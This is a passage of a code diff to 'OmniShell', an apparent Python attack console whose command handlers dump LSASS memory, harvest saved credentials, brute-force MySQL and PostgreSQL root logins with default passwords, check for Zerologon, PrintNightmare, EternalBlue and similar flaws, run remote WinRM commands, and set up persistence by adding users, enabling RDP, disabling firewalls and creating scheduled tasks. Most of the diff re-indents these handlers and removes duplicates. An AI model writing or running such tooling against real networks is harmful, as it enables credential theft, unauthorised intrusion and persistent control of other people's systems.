-                            print(f"{Fore.GREEN}  Processor:       {Fore.WHITE}{info.get('processor', 'N/A')}")
-                            print(f"{Fore.GREEN}  CPU Cores:       {Fore.WHITE}{info.get('processor_cores', 'N/A')}")
+                    if result.get('success'):
+                        info = result.get('system_info', {})
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SYSTEM INFO EXTRACTED")
+                        print(f"\n{Fore.LIGHTGREEN_EX}  ──────────────────────────────────────────────")
+                        print(f"{Fore.GREEN}  Hostname:        {Fore.WHITE}{info.get('hostname', 'N/A')}")
+                        print(f"{Fore.GREEN}  OS:              {Fore.WHITE}{info.get('os_name', 'N/A')}")
+                        print(f"{Fore.GREEN}  OS Version:      {Fore.WHITE}{info.get('os_version', 'N/A')}")
+                        print(f"{Fore.GREEN}  Architecture:    {Fore.WHITE}{info.get('os_architecture', 'N/A')}")
+                        print(f"{Fore.GREEN}  Processor:       {Fore.WHITE}{info.get('processor', 'N/A')}")
+                        print(f"{Fore.GREEN}  CPU Cores:       {Fore.WHITE}{info.get('processor_cores', 'N/A')}")
                         print(f"{Fore.GREEN}  Total RAM:       {Fore.WHITE}{info.get('ram_total', 0)} MB")
                         print(f"{Fore.GREEN}  Used RAM:        {Fore.WHITE}{info.get('ram_used', 0)} MB")
                         print(f"{Fore.GREEN}  Free RAM:        {Fore.WHITE}{info.get('ram_free', 0)} MB")
@@ -2170,85 +2602,85 @@ class OmniShell:
                     else:
                         print(f"{Fore.RED}  ❌ Failed to extract system information")
                 
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
 
-                elif cmd == "lsass-dump":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'lsass-dump <ip>'.")
-                        return
-                    
-                    Visualizer.alert(f"Dumping LSASS on {target} via comsvcs.dll MiniDump ...", "hack")
-                    if self.control and hasattr(self.control, 'lsass_dump'):
-                        result = self.control.lsass_dump(target, self.credentials["user"], self.credentials["pass"])
-                        if result.get("success"):
-                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  LSASS Dumped Successfully")
-                            print(f"  {Fore.WHITE}  Remote path : {result['path']}")
-                            print(f"  {Fore.WHITE}  UNC path    : {result['unc']}")
-                            print(f"  {Fore.WHITE}  Size        : {result.get('size_bytes','?')} bytes")
-                            print(f"\n  {Fore.YELLOW}  Use SMB download to retrieve: smb-download {target} C$ Windows/Temp/lsass.dmp\n")
-                        else:
-                            print(f"\n  {Fore.RED}✘  LSASS dump failed: {result.get('error','unknown')}\n")
+            elif cmd == "lsass-dump":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'lsass-dump <ip>'.")
+                    return
+                
+                Visualizer.alert(f"Dumping LSASS on {target} via comsvcs.dll MiniDump ...", "hack")
+                if self.control and hasattr(self.control, 'lsass_dump'):
+                    result = self.control.lsass_dump(target, self.credentials["user"], self.credentials["pass"])
+                    if result.get("success"):
+                        print(f"\n  {Fore.RED}{Style.BRIGHT}✔  LSASS Dumped Successfully")
+                        print(f"  {Fore.WHITE}  Remote path : {result['path']}")
+                        print(f"  {Fore.WHITE}  UNC path    : {result['unc']}")
+                        print(f"  {Fore.WHITE}  Size        : {result.get('size_bytes','?')} bytes")
+                        print(f"\n  {Fore.YELLOW}  Use SMB download to retrieve: smb-download {target} C$ Windows/Temp/lsass.dmp\n")
                     else:
-                        Visualizer.alert("Control module not loaded", "warn")
+                        print(f"\n  {Fore.RED}✘  LSASS dump failed: {result.get('error','unknown')}\n")
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd == "tokens":
-                    target = args[0] if args else self.selected_target
-                    if not target:
-                        print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'tokens <ip>'.")
-                        return
-                    
-                    Visualizer.alert(f"Harvesting auth tokens from {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'steal_saved_credentials'):
-                        result = self.control.steal_saved_credentials(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"{Fore.CYAN}\n  Token/Credential harvest results:")
-                        print(json.dumps(result, indent=2))
-                    else:
-                        Visualizer.alert("Control module not loaded", "warn")
+            elif cmd == "tokens":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'tokens <ip>'.")
+                    return
+                
+                Visualizer.alert(f"Harvesting auth tokens from {target} ...", "hack")
+                if self.control and hasattr(self.control, 'steal_saved_credentials'):
+                    result = self.control.steal_saved_credentials(target, self.credentials["user"], self.credentials["pass"])
+                    print(f"{Fore.CYAN}\n  Token/Credential harvest results:")
+                    print(json.dumps(result, indent=2))
+                else:
+                    Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd == "mysql-root" and args:
-                    target = args[0]
-                    Visualizer.alert(f"Trying MySQL root access on {target}:3306 ...", "hack")
-                    result = {"target": target, "port": 3306, "attempts": []}
-                    try:
-                        import pymysql
-                        for pw in ["", "root", "password", "admin", "mysql", "toor", "123456"]:
-                            try:
-                                conn = pymysql.connect(host=target, user='root', password=pw, connect_timeout=3, db='information_schema')
-                                cur = conn.cursor()
-                                cur.execute("SELECT user, host, authentication_string FROM mysql.user")
-                                users = cur.fetchall()
-                                result["success"] = True
-                                result["password"] = pw if pw else "(empty)"
-                                result["users"] = [{"user": r[0], "host": r[1]} for r in users]
-                                cur.execute("SHOW DATABASES")
-                                result["databases"] = [r[0] for r in cur.fetchall()]
-                                conn.close()
-                                
-                                print(f"\n  {Fore.RED}{Style.BRIGHT}✔  MySQL root ACCESS on {target}  │  password='{pw if pw else '(empty)}'")
-                                print(f"  {Fore.WHITE}  Databases: {', '.join(result['databases'])}")
-                                print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
-                                break
-                            except Exception as e2:
-                                result["attempts"].append({"password": pw or "(empty)", "error": str(e2)})
-                        if not result.get("success"):
-                            print(f"  {Fore.GREEN}MySQL root access failed — all passwords rejected.")
-                    except ImportError:
+            elif cmd == "mysql-root" and args:
+                target = args[0]
+                Visualizer.alert(f"Trying MySQL root access on {target}:3306 ...", "hack")
+                result = {"target": target, "port": 3306, "attempts": []}
+                try:
+                    import pymysql
+                    for pw in ["", "root", "password", "admin", "mysql", "toor", "123456"]:
                         try:
-                            s = socket.socket()
-                            s.settimeout(3)
-                            r = s.connect_ex((target, 3306))
-                            s.close()
-                            state = "OPEN" if r == 0 else "CLOSED"
-                            print(f"\n  {Fore.YELLOW}  MySQL port 3306: {state} (install pymysql for full exploit)\n")
-                            result["port_state"] = state
-                        except Exception as e:
-                            result["error"] = str(e)
-                            print(f"{json.dumps(result, indent=2)}")
+                            conn = pymysql.connect(host=target, user='root', password=pw, connect_timeout=3, db='information_schema')
+                            cur = conn.cursor()
+                            cur.execute("SELECT user, host, authentication_string FROM mysql.user")
+                            users = cur.fetchall()
+                            result["success"] = True
+                            result["password"] = pw if pw else "(empty)"
+                            result["users"] = [{"user": r[0], "host": r[1]} for r in users]
+                            cur.execute("SHOW DATABASES")
+                            result["databases"] = [r[0] for r in cur.fetchall()]
+                            conn.close()
+                            
+                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  MySQL root ACCESS on {target}  │  password='{pw if pw else '(empty)'}'")
+                            print(f"  {Fore.WHITE}  Databases: {', '.join(result['databases'])}")
+                            print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
+                            break
+                        except Exception as e2:
+                            result["attempts"].append({"password": pw or "(empty)", "error": str(e2)})
+                    if not result.get("success"):
+                        print(f"  {Fore.GREEN}MySQL root access failed — all passwords rejected.")
+                except ImportError:
+                    try:
+                        s = socket.socket()
+                        s.settimeout(3)
+                        r = s.connect_ex((target, 3306))
+                        s.close()
+                        state = "OPEN" if r == 0 else "CLOSED"
+                        print(f"\n  {Fore.YELLOW}  MySQL port 3306: {state} (install pymysql for full exploit)\n")
+                        result["port_state"] = state
+                    except Exception as e:
+                        result["error"] = str(e)
+                        print(f"{json.dumps(result, indent=2)}")
 
-                elif cmd == "postgres" and args:
-                    target = args[0]
-                    Visualizer.alert(f"Trying PostgreSQL access on {target}:5432 ...", "hack")
+            elif cmd == "postgres" and args:
+                target = args[0]
+                Visualizer.alert(f"Trying PostgreSQL access on {target}:5432 ...", "hack")
                 result = {"target": target, "port": 5432, "attempts": []}
                 try:
                     import psycopg2
@@ -2267,9 +2699,9 @@ class OmniShell:
                             result["databases"] = dbs
                             result["users"] = [{"user":r[0],"superuser":r[1]} for r in users]
                             conn.close()
-                        print(f"\n  {Fore.RED}{Style.BRIGHT}✔  PostgreSQL ACCESS on {target}  │  {u}:'{pw if pw else '(empty)'}'")
-                        print(f"  {Fore.WHITE}  Databases: {', '.join(dbs)}")
-                        print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
+                            print(f"\n  {Fore.RED}{Style.BRIGHT}✔  PostgreSQL ACCESS on {target}  │  {u}:'{pw if pw else '(empty)'}'")
+                            print(f"  {Fore.WHITE}  Databases: {', '.join(dbs)}")
+                            print(f"  {Fore.WHITE}  Users    : {json.dumps(result['users'], indent=2)}\n")
                             break
                         except Exception as e2:
                             result["attempts"].append({"user": u, "password": pw or "(empty)", "error": str(e2)})
@@ -2288,9 +2720,9 @@ class OmniShell:
                         result["error"] = str(e)
                         print(f"{json.dumps(result, indent=2)}")
 
-                elif cmd == "s3-scan" and args:
+            elif cmd == "s3-scan" and args:
                 bucket = args[0]
-                    Visualizer.alert(f"Scanning S3 bucket: {bucket}", "hack")
+                Visualizer.alert(f"Scanning S3 bucket: {bucket}", "hack")
                 import urllib.request
                 result = {"bucket": bucket, "public": False, "objects": []}
                 try:
@@ -2302,59 +2734,58 @@ class OmniShell:
                             content = resp.read().decode('utf-8', errors='ignore')
                             if "<ListBucketResult" in content:
                                 result["objects"] = re.findall(r'<Key>(.*?)</Key>', content)[:20]
-                        print(f"\n  {Fore.GREEN if result['public'] else Fore.YELLOW}  Bucket {bucket}: {'PUBLICLY ACCESSIBLE' if result['public'] else 'Not public'}")
+                    print(f"\n  {Fore.GREEN if result['public'] else Fore.YELLOW}  Bucket {bucket}: {'PUBLICLY ACCESSIBLE' if result['public'] else 'Not public'}")
                     if result['objects']:
                         print(f"  {Fore.WHITE}  Public objects: {len(result['objects'])}")
                         for obj in result['objects'][:10]:
-                        print(f"    - {obj}")
+                            print(f"    - {obj}")
                         print()
                 except Exception as e:
-                        print(f"  {Fore.RED}Scan failed: {e}")
-                        print(f"{json.dumps(result, indent=2)}")
+                    print(f"  {Fore.RED}Scan failed: {e}")
+                    print(f"{json.dumps(result, indent=2)}")
 
-                elif cmd == "scan-exploit" and args:
+            elif cmd == "scan-exploit" and args:
                 ip_range = args[0]
-                    Visualizer.alert(f"Scan & exploit all hosts in {ip_range} ...", "hack")
-                    if self.control and hasattr(self.control, 'scan_and_exploit_network'):
+                Visualizer.alert(f"Scan & exploit all hosts in {ip_range} ...", "hack")
+                if self.control and hasattr(self.control, 'scan_and_exploit_network'):
                     result = self.control.scan_and_exploit_network(ip_range)
                     total = result.get("total_scanned", 0)
                     owned = result.get("owned", 0)
-                        print(f"\n  {Fore.RED}{Style.BRIGHT}Scan-Exploit complete:")
-                        print(f"  {Fore.WHITE}  Hosts scanned : {total}")
-                        print(f"  {Fore.GREEN}{Style.BRIGHT}  Owned         : {owned}")
+                    print(f"\n  {Fore.RED}{Style.BRIGHT}Scan-Exploit complete:")
+                    print(f"  {Fore.WHITE}  Hosts scanned : {total}")
+                    print(f"  {Fore.GREEN}{Style.BRIGHT}  Owned         : {owned}")
                     hosts = result.get("hosts", [])
                     for h in hosts:
                         col = Fore.RED if h.get("owned") else Fore.WHITE
                         print(f"  {col}  {h.get('ip','?'):<16} {h.get('method','')}")
-                        print()
+                    print()
                 elif self.universal:
                     result = self.universal.discover_all_devices(ip_range)
-                        print(f"\n  Found {len(result)} hosts in {ip_range}")
+                    print(f"\n  Found {len(result)} hosts in {ip_range}")
                     for d in result:
                         print(f"  {Fore.CYAN}  {d.ip:<16} {getattr(d,'hostname','') or ''}")
-                    else:
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
 
             # ==================== WIN10/11 EXPLOITS ====================
-
-                elif cmd == "smbghost" and args:
-                    target = args[0]
-                    Visualizer.alert(f"SMBGhost (CVE-2020-0796) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'check_smbghost'):
+            elif cmd == "smbghost" and args:
+                target = args[0]
+                Visualizer.alert(f"SMBGhost (CVE-2020-0796) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'check_smbghost'):
                     result = self.control.check_smbghost(target)
                     vuln = result.get("vulnerable", False)
                     color = Fore.RED if vuln else Fore.GREEN
                     status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2020-0796 (SMBGhost)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
-                    else:
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-0796 (SMBGhost)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd == "printnightmare" and args:
-                    target = args[0]
-                    Visualizer.alert(f"PrintNightmare (CVE-2021-34527) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'check_printnightmare'):
+            elif cmd == "printnightmare" and args:
+                target = args[0]
+                Visualizer.alert(f"PrintNightmare (CVE-2021-34527) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'check_printnightmare'):
                     result = self.control.check_printnightmare(
                         target,
                         self.credentials["user"],
@@ -2363,60 +2794,60 @@ class OmniShell:
                     vuln = result.get("vulnerable", False)
                     color = Fore.RED if vuln else Fore.GREEN
                     status = "VULNERABLE" if vuln else "NOT VULNERABLE / PATCHED"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2021-34527 (PrintNightmare)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
-                    else:
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-34527 (PrintNightmare)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd == "petitpotam" and args:
-                    target = args[0]
-                    Visualizer.alert(f"PetitPotam (CVE-2021-36942) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'check_petitpotam'):
+            elif cmd == "petitpotam" and args:
+                target = args[0]
+                Visualizer.alert(f"PetitPotam (CVE-2021-36942) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'check_petitpotam'):
                     result = self.control.check_petitpotam(target)
                     vuln = result.get("vulnerable", False)
                     color = Fore.RED if vuln else Fore.GREEN
                     status = "VULNERABLE (unauthenticated NTLM coercion possible)" if vuln else "NOT VULNERABLE"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2021-36942 (PetitPotam)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
-                    else:
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2021-36942 (PetitPotam)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd == "zerologon" and args:
-                    target = args[0]
+            elif cmd == "zerologon" and args:
+                target = args[0]
                 dc_name = args[1] if len(args) > 1 else ""
-                    Visualizer.alert(f"Zerologon (CVE-2020-1472) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'check_zerologon'):
+                Visualizer.alert(f"Zerologon (CVE-2020-1472) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'check_zerologon'):
                     result = self.control.check_zerologon(target, dc_name)
                     vuln = result.get("vulnerable", False)
                     color = Fore.RED if vuln else Fore.GREEN
                     status = "NETLOGON REACHABLE — check patch level" if vuln else "NOT REACHABLE"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2020-1472 (Zerologon)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
-                    else:
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2020-1472 (Zerologon)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Details : {result.get('details', 'N/A')}\n")
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd in ("nopac",) and args:
-                    target = args[0]
-                    Visualizer.alert(f"NoPac (CVE-2021-42278) AD check on {target} - checking SMB+LDAP...", "hack")
-                    if self.control and hasattr(self.control, 'smb_check_vulns'):
+            elif cmd in ("nopac",) and args:
+                target = args[0]
+                Visualizer.alert(f"NoPac (CVE-2021-42278) AD check on {target} - checking SMB+LDAP...", "hack")
+                if self.control and hasattr(self.control, 'smb_check_vulns'):
                     sv = self.control.smb_check_vulns(target)
                     vulns = sv.get("vulns", [])
                     is_dc = any("DOMAIN_CONTROLLER" in v or "LDAP" in v for v in vulns)
-                        print(f"\n  {Fore.RED if is_dc else Fore.YELLOW}{Style.BRIGHT}  CVE-2021-42278 (NoPac)  │  {'DOMAIN CONTROLLER CANDIDATE' if is_dc else 'Not a detected DC'}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  SMB vulns found: {', '.join(vulns) or 'none'}\n")
-                    else:
+                    print(f"\n  {Fore.RED if is_dc else Fore.YELLOW}{Style.BRIGHT}  CVE-2021-42278 (NoPac)  │  {'DOMAIN CONTROLLER CANDIDATE' if is_dc else 'Not a detected DC'}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  SMB vulns found: {', '.join(vulns) or 'none'}\n")
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd in ("winrm-exec",) and len(args) >= 2:
-                    target = args[0]
+            elif cmd in ("winrm-exec",) and len(args) >= 2:
+                target = args[0]
                 command = " ".join(args[1:])
                 port = self.credentials.get("winrm_port", 5985)
-                    Visualizer.alert(f"WinRM exec on {target}:{port} → {command[:60]}", "hack")
-                    if self.control and hasattr(self.control, 'winrm_exec'):
+                Visualizer.alert(f"WinRM exec on {target}:{port} → {command[:60]}", "hack")
+                if self.control and hasattr(self.control, 'winrm_exec'):
                     result = self.control.winrm_exec(
                         target, self.credentials["user"], self.credentials["pass"],
                         command, port=port
@@ -2428,26 +2859,26 @@ class OmniShell:
                         print(f"\n  {Fore.RED}{Style.BRIGHT}✘  WinRM Failed: {result.get('error','unknown')}")
                     if result.get("error_detail"):
                         print(f"  {Fore.YELLOW}  Detail: {result['error_detail']}\n")
-                    else:
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd in ("etblue-check", "eternalblue-check") and args:
-                    target = args[0]
-                    Visualizer.alert(f"EternalBlue (CVE-2017-0143) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'smb_check_vulns'):
+            elif cmd in ("etblue-check", "eternalblue-check") and args:
+                target = args[0]
+                Visualizer.alert(f"EternalBlue (CVE-2017-0143) check on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'smb_check_vulns'):
                     result = self.control.smb_check_vulns(target)
                     vuln = "SMB_VULNERABLE_MS17_010" in result.get("vulns", [])
                     color = Fore.RED if vuln else Fore.GREEN
                     status = "VULNERABLE TO ETERNALBLUE" if vuln else "NOT VULNERABLE / PATCHED"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2017-0143 (EternalBlue)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Vulns   : {', '.join(result.get('vulns', [])) or 'none'}\n")
-                    else:
+                    print(f"\n  {color}{Style.BRIGHT}  CVE-2017-0143 (EternalBlue)  │  {status}")
+                    print(f"  {Fore.WHITE}  Target  : {target}")
+                    print(f"  {Fore.WHITE}  Vulns   : {', '.join(result.get('vulns', [])) or 'none'}\n")
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
 
-                elif cmd in ("bluekeep-check", "rdp-vuln") and args:
-                    target = args[0]
-                    Visualizer.alert(f"BlueKeep (CVE-2019-0708) RDP check on {target} ...", "hack")
+            elif cmd in ("bluekeep-check", "rdp-vuln") and args:
+                target = args[0]
+                Visualizer.alert(f"BlueKeep (CVE-2019-0708) RDP check on {target} ...", "hack")
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(3)
@@ -2462,88 +2893,33 @@ class OmniShell:
                 except Exception as e:
                     Visualizer.alert(f"BlueKeep check error: {e}", "error")
 
-                elif cmd in ("smb-vulns", "smb-scan") and args:
-                    target = args[0]
-                    Visualizer.alert(f"Full SMB vulnerability scan (Win7→Win11) on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'smb_check_vulns'):
+            elif cmd in ("smb-vulns", "smb-scan") and args:
+                target = args[0]
+                Visualizer.alert(f"Full SMB vulnerability scan (Win7→Win11) on {target} ...", "hack")
+                if self.control and hasattr(self.control, 'smb_check_vulns'):
                     result = self.control.smb_check_vulns(target)
                     vulns = result.get("vulns", [])
                     info  = result.get("info", {})
-                        print(f"\n  {Fore.CYAN}{Style.BRIGHT}SMB Vulnerability Scan: {target}")
-                        print(f"  {Fore.BLUE}{'─'*56}")
+                    print(f"\n  {Fore.CYAN}{Style.BRIGHT}SMB Vulnerability Scan: {target}")
+                    print(f"  {Fore.BLUE}{'─'*56}")
                     if vulns:
                         for v in vulns:
                             if "VULN" in v or "GHOST" in v or "NIGHTMARE" in v or "POTAM" in v:
-                        print(f"  {Fore.RED}{Style.BRIGHT}  ☠  {v}")
-                elif "OPEN" in v or "DETECT" in v or "ENABLE" in v:
-                        print(f"  {Fore.YELLOW}{Style.BRIGHT}  ⚠  {v}")
-                    else:
-                        print(f"  {Fore.WHITE}  •  {v}")
-                    else:
-                        print(f"  {Fore.GREEN}  No critical vulnerabilities detected")
-                        print(f"  {Fore.BLUE}{'─'*56}")
-                        print(f"  {Fore.WHITE}  SMB Info: {json.dumps(info, indent=2)}\n")
-                    else:
-                    Visualizer.alert("Control module not loaded", "warn")
-
-                elif cmd == "smb-vulns" and args:
-                    target = args[0]
-                    Visualizer.alert(f"Full SMB vulnerability scan (Win7→Win11) on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'smb_check_vulns'):
-                    result = self.control.smb_check_vulns(target)
-                    vulns = result.get("vulns", [])
-                    info  = result.get("info", {})
-                        print(f"\n  {Fore.CYAN}{Style.BRIGHT}SMB Vulnerability Scan: {target}")
-                        print(f"  {Fore.BLUE}{'─'*56}")
-                    if vulns:
-                        for v in vulns:
-                            if "VULN" in v or "GHOST" in v or "NIGHTMARE" in v or "POTAM" in v:
-                        print(f"  {Fore.RED}{Style.BRIGHT}  ☠  {v}")
-                elif "OPEN" in v or "DETECT" in v or "ENABLE" in v:
-                        print(f"  {Fore.YELLOW}{Style.BRIGHT}  ⚠  {v}")
-                    else:
-                        print(f"  {Fore.WHITE}  •  {v}")
+                                print(f"  {Fore.RED}{Style.BRIGHT}  ☠  {v}")
+                            elif "OPEN" in v or "DETECT" in v or "ENABLE" in v:
+                                print(f"  {Fore.YELLOW}{Style.BRIGHT}  ⚠  {v}")
+                            else:
+                                print(f"  {Fore.WHITE}  •  {v}")
                     else:
                         print(f"  {Fore.GREEN}  No critical vulnerabilities detected")
-                        print(f"  {Fore.BLUE}{'─'*56}")
-                        print(f"  {Fore.WHITE}  SMB Info: {json.dumps(info, indent=2)}\n")
-                    else:
+                    print(f"  {Fore.BLUE}{'─'*56}")
+                    print(f"  {Fore.WHITE}  SMB Info: {json.dumps(info, indent=2)}\n")
+                else:
                     Visualizer.alert("Control module not loaded", "warn")
-
-                elif cmd in ("etblue-check",) and args:
-                    target = args[0]
-                    Visualizer.alert(f"EternalBlue (CVE-2017-0143) check on {target} ...", "hack")
-                    if self.control and hasattr(self.control, 'smb_check_vulns'):
-                    result = self.control.smb_check_vulns(target)
-                    vuln = "SMB_VULNERABLE_MS17_010" in result.get("vulns", [])
-                    color = Fore.RED if vuln else Fore.GREEN
-                    status = "VULNERABLE TO ETERNALBLUE" if vuln else "NOT VULNERABLE / PATCHED"
-                        print(f"\n  {color}{Style.BRIGHT}  CVE-2017-0143 (EternalBlue)  │  {status}")
-                        print(f"  {Fore.WHITE}  Target  : {target}")
-                        print(f"  {Fore.WHITE}  Vulns   : {', '.join(result.get('vulns', [])) or 'none'}\n")
-                    else:
-                    Visualizer.alert("Control module not loaded", "warn")
-
-                elif cmd in ("bluekeep-check",) and args:
-                    target = args[0]
-                    Visualizer.alert(f"BlueKeep (CVE-2019-0708) RDP check on {target} ...", "hack")
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(3)
-                    rdp_open = s.connect_ex((target, 3389)) == 0
-                    s.close()
-                    if rdp_open:
-                        print(f"\n  {Fore.YELLOW}{Style.BRIGHT}  CVE-2019-0708 (BlueKeep)  │  RDP PORT OPEN (3389)")
-                        print(f"  {Fore.WHITE}  Target: {target}  │  Check Windows version: Win7/Server 2008 = VULNERABLE")
-                    else:
-                        print(f"\n  {Fore.GREEN}{Style.BRIGHT}  CVE-2019-0708 (BlueKeep)  │  RDP PORT CLOSED")
-                        print(f"  {Fore.WHITE}  Target: {target}\n")
-                except Exception as e:
-                    Visualizer.alert(f"BlueKeep check error: {e}", "error")
 
             # ==================== PERSISTENCE ====================
-                elif cmd == "adduser" and len(args) >= 1:
-                    target = self.selected_target
+            elif cmd == "adduser" and len(args) >= 1:
+                target = self.selected_target
                 u = args[0]
                 p = args[1] if len(args) > 1 else "Password123!"
                 
@@ -2553,43 +2929,43 @@ class OmniShell:
                     p = args[2] if len(args) > 2 else "Password123!"
                     
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
                     
-                    if self.control and hasattr(self.control, 'add_local_user'):
+                if self.control and hasattr(self.control, 'add_local_user'):
                     self.control.add_local_user(target, self.credentials["user"], self.credentials["pass"], u, p)
-                        print(f"[+] User {u} created on {target}")
+                    print(f"[+] User {u} created on {target}")
 
-                elif cmd == "rdp-enable":
-                    target = args[0] if args else self.selected_target
+            elif cmd == "rdp-enable":
+                target = args[0] if args else self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'enable_rdp'):
+                if self.control and hasattr(self.control, 'enable_rdp'):
                     self.control.enable_rdp(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] RDP enabled on {target}")
+                    print(f"[+] RDP enabled on {target}")
 
-                elif cmd == "firewall-off":
-                    target = args[0] if args else self.selected_target
+            elif cmd == "firewall-off":
+                target = args[0] if args else self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'disable_firewall'):
+                if self.control and hasattr(self.control, 'disable_firewall'):
                     self.control.disable_firewall(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Firewall disabled on {target}")
+                    print(f"[+] Firewall disabled on {target}")
 
-                elif cmd == "firewall-on" and args:
-                    if self.control and hasattr(self.control, 'enable_firewall'):
+            elif cmd == "firewall-on" and args:
+                if self.control and hasattr(self.control, 'enable_firewall'):
                     self.control.enable_firewall(args[0], self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Firewall enabled")
+                    print(f"[+] Firewall enabled")
 
-                elif cmd == "firewall-add" and len(args) >= 2:
-                    if self.control and hasattr(self.control, 'add_firewall_exception'):
+            elif cmd == "firewall-add" and len(args) >= 2:
+                if self.control and hasattr(self.control, 'add_firewall_exception'):
                     self.control.add_firewall_exception(args[0], self.credentials["user"], self.credentials["pass"], int(args[1]))
-                        print(f"[+] Firewall rule added")
+                    print(f"[+] Firewall rule added")
 
-                elif cmd == "persist-task":
-                    target = self.selected_target
+            elif cmd == "persist-task":
+                target = self.selected_target
                 task_name = args[0] if len(args) > 0 else "SystemUpdate"
                 task_path = args[1] if len(args) > 1 else "notepad.exe"
                 
@@ -2599,35 +2975,35 @@ class OmniShell:
                     task_path = args[2] if len(args) > 2 else "notepad.exe"
                     
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
                     
-                    if self.control and hasattr(self.control, 'create_scheduled_task'):
+                if self.control and hasattr(self.control, 'create_scheduled_task'):
                     self.control.create_scheduled_task(target, self.credentials["user"], self.credentials["pass"], task_name, task_path)
-                        print(f"[+] Task {task_name} created on {target}")
+                    print(f"[+] Task {task_name} created on {target}")
                 
             # ==================== SYSTEM ====================
-                elif cmd == "shutdown":
-                    target = args[0] if args else self.selected_target
+            elif cmd == "shutdown":
+                target = args[0] if args else self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
